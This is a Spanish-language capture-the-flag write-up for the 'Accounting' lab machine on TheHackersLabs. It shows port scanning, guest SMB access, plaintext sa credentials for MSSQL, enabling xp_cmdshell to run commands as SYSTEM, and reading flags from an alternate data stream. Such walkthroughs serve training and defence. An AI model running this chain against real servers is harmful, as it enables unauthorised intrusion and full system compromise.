# Writeup — Accounting (TheHackersLabs)

**Plataforma:** TheHackersLabs  
**Sistema:** Windows 10 Build 19041 x64  
**IP:** 10.10.10.20  
**Objetivo:** Obtener user.txt y root.txt

---

## 1. Reconocimiento

```bash
sudo nmap -sn 10.10.10.0/24
```

Target: `10.10.10.20` (MAC Oracle VirtualBox).

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.20 -oG all_ports.txt
```

Puertos abiertos:
```
135,139,445,1099,1801,2103,2105,2107,5040,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49668,49669,49670,49732,49992
```

```bash
nmap -p135,139,445,1099,1801,2103,2105,2107,5040,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49668,49669,49670,49732,49992 -sCV -vvv 10.10.10.20 -oN tcp_scan.txt
```

Resultados relevantes:
- **SMB (445):** Windows 10 Build 19041, hostname `DESKTOP-M464J3M`, signing enabled but not required.
- **Java RMI (1099):** Java Object Serialization.
- **Cassini web (9081):** Microsoft Cassini 4.0.1.6 (ASP.NET).
- **MSSQL (49992):** SQL Server 2017, instancia `COMPAC`.

---

## 2. Enumeración SMB

```bash
smbclient -L //10.10.10.20/ -N
```

Shares disponibles: `ADMIN$`, `C$`, `Compac`, `IPC$`, `Users`.

```bash
nxc smb 10.10.10.20 -u 'guest' -p ''
```
`guest` con contraseña vacía permite acceso.

Explorando `Users`:
```bash
smbclient //10.10.10.20/Users -U guest
```
Dos directorios de usuarios: `admin` (sin acceso con guest) y `contpaqi` (contenido completo del perfil).

Explorando `Compac`:
```bash
smbclient //10.10.10.20/Compac -U guest
```
Dentro: `Empresas/` y `Index/`.

Descarga recursiva del contenido:

```
smb: \> mask ""
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
```

---

## 3. Credenciales MSSQL

En `Empresas/SQL.txt`:

```
SQL 2017
Instancia COMPAC
sa
Contpaqi2023.
```

---

## 4. Conexión a MSSQL como `sa`

```bash
impacket-mssqlclient sa:Contpaqi2023.@10.10.10.20 -port 49992
```

```
[*] Encryption required, switching to TLS
[*] INFO(DESKTOP-M464J3M\COMPAC): Changed database context to 'master'.
```

---

## 5. Ejecución de comandos (xp_cmdshell)

Habilitamos `xp_cmdshell` (dentro de `impacket-mssqlclient` se puede usar `enable_xp_cmdshell`, o manualmente con `sp_configure`):

```sql
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Verificamos el usuario:

```sql
xp_cmdshell 'whoami'
```

Salida: **`nt authority\system`**

---

## 6. Flags

### 6.1. User flag

Ubicación: `C:\Users\contpaqi\Desktop\user.txt`

```sql
xp_cmdshell "type C:\Users\contpaqi\Desktop\user.txt"
```

```
<REDACTED>
```

### 6.2. Admin flag

Ubicación: `C:\Users\admin\Desktop\root.txt` (ADS `HI`)

La flag está oculta en un **Alternate Data Stream (ADS)** llamado `HI` dentro de `root.txt`. Primero listamos los streams ocultos:

```sql
xp_cmdshell "cmd /c dir /r C:\Users\admin\Desktop"
```

```
...
05/10/2024  08:05 PM             1,192 root.txt
                                    35 root.txt:HI:$DATA
```

Y leemos el stream:

```sql
xp_cmdshell "cmd /c more < C:\Users\admin\Desktop\root.txt:HI"
```

```
<REDACTED>
```

---

## 7. Resumen

1. Escaneo de red descubre un Windows con SMB, MSSQL y un web server Cassini.
2. Acceso guest a SMB revela un share `Compac` con un archivo `SQL.txt` que contiene credenciales `sa:Contpaqi2023.`.
3. Conexión a MSSQL como `sa` permite ejecutar comandos del sistema mediante `xp_cmdshell`.
4. El servicio MSSQL corre como `nt authority\system`, comprometiendo totalmente el sistema.
5. Se extraen `user.txt` y la flag de admin oculta en un ADS `HI` de `root.txt`.

**Flags:**
- **User:** `<REDACTED>`
- **Root:** `<REDACTED>` (ADS `root.txt:HI`)
